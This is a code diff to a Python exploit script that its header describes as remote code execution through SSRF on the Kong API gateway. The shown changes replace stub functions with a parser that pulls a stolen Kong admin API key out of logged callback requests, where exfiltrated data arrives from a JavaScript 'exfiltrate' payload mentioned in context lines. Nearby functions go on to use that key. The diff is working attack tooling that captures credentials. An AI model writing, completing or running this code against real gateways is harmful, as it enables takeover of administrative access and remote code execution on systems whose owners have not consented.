@@ -4,6 +4,10 @@ Date: March 2025
 Description: A remote code execution exploit that leverages SSRF on the Kong API gateway.
 """
 
+import re
+import json
+import urllib.parse
+
 def log(message):
     """
     Prints a string, message, to standard output.
@@ -42,19 +46,38 @@ function exfiltrate() {{
     
     return html_template
 
-def parseAPIKeyResponse(response):
+def parseForKey(response):
     """
-    Parses response from Kong API Gateway to get Admin Panel API key.
+    Extracts the API key from a URL-encoded callback response in a log entry.
+    
+    Args:
+        response (str): Log entry string containing the callback URL with JSON data
+        
+    Returns:
+        str: The extracted API key or None if not found
     """
-
-    pass
-
-def getAPIKey(url):
-    """
-    Leverages SSRF on Kong API gateway found at URL return API key for admin panel.
-    """
-
-    pass
+    # Extract the URL-encoded query parameter using regex
+    match = re.search(r'GET /callback\?([^ ]+)', response)
+    if not match:
+        return None
+    
+    # URL decode the parameter
+    encoded_data = match.group(1)
+    decoded_data = urllib.parse.unquote(encoded_data)
+    
+    try:
+        # Parse the JSON data
+        data = json.loads(decoded_data)
+        
+        # Extract the key from the first item in the data array
+        if data and 'data' in data and isinstance(data['data'], list) and len(data['data']) > 0:
+            for item in data['data']:
+                if 'key' in item:
+                    return item['key']
+        
+        return None
+    except json.JSONDecodeError:
+        return None
 
 def checkPlugins(url, apikey):
     """
